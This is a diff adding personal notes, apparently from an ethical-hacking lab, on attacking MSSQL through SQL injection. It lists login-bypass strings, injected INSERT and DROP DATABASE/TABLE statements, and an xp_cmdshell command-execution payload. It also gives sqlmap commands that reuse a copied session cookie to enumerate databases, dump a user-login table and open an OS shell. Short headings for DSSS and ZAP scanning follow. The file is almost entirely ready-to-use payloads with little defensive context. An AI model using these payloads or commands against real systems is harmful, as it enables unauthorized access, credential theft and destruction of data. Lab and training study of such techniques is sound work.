@@ -1,0 +1,33 @@
+# Perform an SQL Injection Attack on an MSSQL Database
+-------------------------------------------------------
+1. open browser  >>  http://www.goodshopping.com/  >> login  >> enter blow malicious queries in user field and leave password fied blank
+2. blah' or 1=1 --    (bypass login)
+2. blah';insert into login values ('john','apple123'); --     (create new login credentials in database through sql-injection)
+4. blah';create database mydatabase; --     (create new database)
+5. blah'; DROP DATABASE mydatabase; --      (delete created databese)
+6. blah'; DROP TABLE dbo.Login; --           (delete dbo.login table)
+7. blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --     (In the above query, you are pinging the www.certifiedhacker.com website using an SQL injection query. -l is the sent buffer size and -t refers to pinging the specific host)
+
+
+======================================================================================================================================================================================================================================================================================
+
+# Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap
+-----------------------------------------------------------------------------------
+1. open browser  >> www.moviescope.com  >> login(' or 1=1 --)(password) >>  inspect element >> console >> type "documet.cookies" (gives website cookies)
+2. start sqlmap 
+  >> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 1]" --dbs        
+    > [-u: specifies the target URL (the one you noted down in Step 6), --cookie: specifies the HTTP cookie header value, and --dbs: enumerates DBMS databases.]
+  >> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 1]" -D moviescope --tables
+    > [-D: specifies the DBMS database to enumerate and --tables: enumerates DBMS database tables.]
+  >> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 1]" -D moviescope -T User_Login --dump 
+    > [dump all the User_Login table content]
+  >> sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 1]" --os-shell
+    > [--os-shell: is the prompt for an interactive OS shell]
+3. os-shell> HELP, TASKLIST
+
+
+=========================================================================================================================================================================================================================================================================================
+# Detect SQL Injection Vulnerabilities using DSSS  :  python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[document.cookie value]
+---------------------------------------------------
+# Detect SQL Injection Vulnerabilities using OWASP ZAP
+------------------------------------------------------
